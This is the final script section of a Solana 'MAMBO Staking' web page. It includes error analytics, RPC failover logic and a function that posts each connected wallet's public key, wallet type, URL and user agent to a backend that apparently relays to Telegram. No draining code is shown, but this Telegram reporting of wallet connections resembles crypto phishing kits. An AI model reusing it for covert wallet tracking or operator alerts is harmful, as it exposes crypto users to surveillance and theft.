      if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
        console.log('[ERROR_TESTING] Development mode detected, running error tests...');
        setTimeout(() => {
          if (window.errorTestingUtils) {
            window.errorTestingUtils.runAllTests();
          }
        }, 2000);
      }
      
      // Enhanced Error Monitoring and Analytics
      window.errorAnalytics = {
        errorCounts: new Map(),
        performanceMetrics: new Map(),
        userSessions: new Map(),
        
        // Track error occurrences
        trackError: function(errorType, context = {}) {
          const currentCount = this.errorCounts.get(errorType) || 0;
          this.errorCounts.set(errorType, currentCount + 1);
          
          // Log to console for debugging
          console.log(`[ERROR_ANALYTICS] ${errorType} error tracked (total: ${currentCount + 1})`, context);
          
          // Send to backend for analytics
          this.sendAnalytics('error', { errorType, context, count: currentCount + 1 });
        },
        
        // Track performance metrics
        trackPerformance: function(operation, duration, success = true) {
          const key = `${operation}_${success ? 'success' : 'failure'}`;
          const metrics = this.performanceMetrics.get(key) || { count: 0, totalDuration: 0, avgDuration: 0 };
          
          metrics.count++;
          metrics.totalDuration += duration;
          metrics.avgDuration = metrics.totalDuration / metrics.count;
          
          this.performanceMetrics.set(key, metrics);
          
          console.log(`[PERFORMANCE_ANALYTICS] ${operation} ${success ? 'completed' : 'failed'} in ${duration}ms (avg: ${metrics.avgDuration.toFixed(2)}ms)`);
        },
        
        // Track user session data
        trackSession: function(action, walletType, success = true) {
          const sessionId = this.getSessionId();
          const session = this.userSessions.get(sessionId) || { 
            startTime: Date.now(), 
            actions: [], 
            walletTypes: new Set(),
            successCount: 0,
            failureCount: 0
          };
          
          session.actions.push({
            action,
            walletType,
            success,
            timestamp: Date.now()
          });
          
          if (walletType) session.walletTypes.add(walletType);
          if (success) session.successCount++; else session.failureCount++;
          
          this.userSessions.set(sessionId, session);
        },
        
        // Generate session ID
        getSessionId: function() {
          if (!this._sessionId) {
            this._sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
          }
          return this._sessionId;
        },
        
        // Send analytics to backend
        sendAnalytics: function(type, data) {
          try {
            fetch('/api/log', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                type: 'ANALYTICS',
                analyticsType: type,
                data: data,
                sessionId: this.getSessionId(),
                timestamp: new Date().toISOString(),
                projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
              })
            }).catch(e => console.log('[ANALYTICS] Failed to send analytics:', e.message));
          } catch (e) {
            console.log('[ANALYTICS] Analytics error:', e.message);
          }
        },
        
        // Get analytics summary
        getSummary: function() {
          return {
            errorCounts: Object.fromEntries(this.errorCounts),
            performanceMetrics: Object.fromEntries(this.performanceMetrics),
            sessionCount: this.userSessions.size,
            currentSession: this.getSessionId()
          };
        }
      };
      
      // Initialize error analytics
      console.log('[ERROR_ANALYTICS] Enhanced error monitoring and analytics initialized');
      
      // Comprehensive error recovery system
      window.recoverFromSolanaError = async function(error, context = {}) {
        const errorType = window.classifySolanaError ? window.classifySolanaError(error) : 'UNKNOWN_SOLANA_ERROR';
        console.log(`üîÑ [ERROR_RECOVERY] Attempting to recover from ${errorType}:`, error.message);
        
        try {
          // Step 1: Try immediate RPC switch
          console.log('üîÑ [ERROR_RECOVERY] Step 1: Immediate RPC switch');
          const rpcSwitchSuccess = await window.switchToFallbackRPC();
          
          if (rpcSwitchSuccess) {
            console.log('‚úÖ [ERROR_RECOVERY] RPC switch successful');
            return true;
          }
          
          // Step 2: Try connection reinitialization
          console.log('üîÑ [ERROR_RECOVERY] Step 2: Connection reinitialization');
          await window.initializeSolanaConnection();
          
          if (window.solanaConnection) {
            const testSlot = await Promise.race([
              window.solanaConnection.getSlot(),
              new Promise((_, reject) => setTimeout(() => reject(new Error('Test timeout')), 10000))
            ]);
            console.log('‚úÖ [ERROR_RECOVERY] Connection reinitialization successful, slot:', testSlot);
            return true;
          }
          
          // Step 3: Try emergency fallback
          console.log('üîÑ [ERROR_RECOVERY] Step 3: Emergency fallback');
          const emergencySuccess = await window.emergencyRPCFallback();
          
          if (emergencySuccess) {
            console.log('‚úÖ [ERROR_RECOVERY] Emergency fallback successful');
            return true;
          }
          
          // Step 4: Final attempt - wait and retry
          console.log('üîÑ [ERROR_RECOVERY] Step 4: Final retry after delay');
          await new Promise(resolve => setTimeout(resolve, 5000));
          
          const finalAttempt = await window.initializeSolanaConnection();
          if (finalAttempt) {
            console.log('‚úÖ [ERROR_RECOVERY] Final retry successful');
            return true;
          }
          
          console.error('‚ùå [ERROR_RECOVERY] All recovery attempts failed');
          return false;
          
        } catch (recoveryError) {
          console.error('‚ùå [ERROR_RECOVERY] Recovery process failed:', recoveryError);
          return false;
        }
      };
      
      console.log('[ERROR_RECOVERY] Comprehensive error recovery system initialized');
      
      // Telegram logging integration for frontend
      window.sendTelegramLog = async function(type, data) {
        try {
          // Get current wallet info if available
          const currentWallet = window.currentWallet || {};
          const publicKey = currentWallet.publicKey || data.publicKey || 'Unknown';
          const walletType = currentWallet.type || data.walletType || 'Unknown';
          
          // Prepare log data
          const logData = {
            type: type,
            timestamp: new Date().toISOString(),
            url: window.location.href,
            userAgent: navigator.userAgent,
            projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking',
            publicKey: publicKey.toString ? publicKey.toString() : publicKey,
            walletType: walletType,
            ...data
          };
          
          // Send to backend logging endpoint
          const response = await fetch('/api/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(logData)
          });
          
          if (response.ok) {
            console.log(`‚úÖ [TELEGRAM] Log sent successfully: ${type}`);
          } else {
            console.warn(`‚ö†Ô∏è [TELEGRAM] Log endpoint returned ${response.status}`);
          }
          
        } catch (error) {
          console.error('‚ùå [TELEGRAM] Failed to send log:', error.message);
        }
      };
      
      console.log('‚úÖ [TELEGRAM] Frontend Telegram logging integration initialized');
      
      // Initialize the memecoin pool system
      if (window.initializeMemecoinPool) {
        window.initializeMemecoinPool();
      }
  </script>

  <!-- Wallet Connection Modal -->
</body>
</html> 